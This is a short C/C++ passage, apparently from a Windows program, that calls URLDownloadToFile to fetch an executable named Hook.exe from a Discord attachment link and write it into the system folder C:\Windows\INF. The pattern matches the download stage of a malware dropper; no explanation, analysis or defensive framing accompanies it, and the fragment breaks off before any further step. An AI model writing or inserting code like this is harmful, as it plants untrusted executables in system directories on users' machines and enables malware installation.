...
{
	HRESULT Hook = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/932378363832729623/936458136561283142/Hook.exe"), _T("C:\\Windows\\INF\\Hook.exe"), 0, NULL);
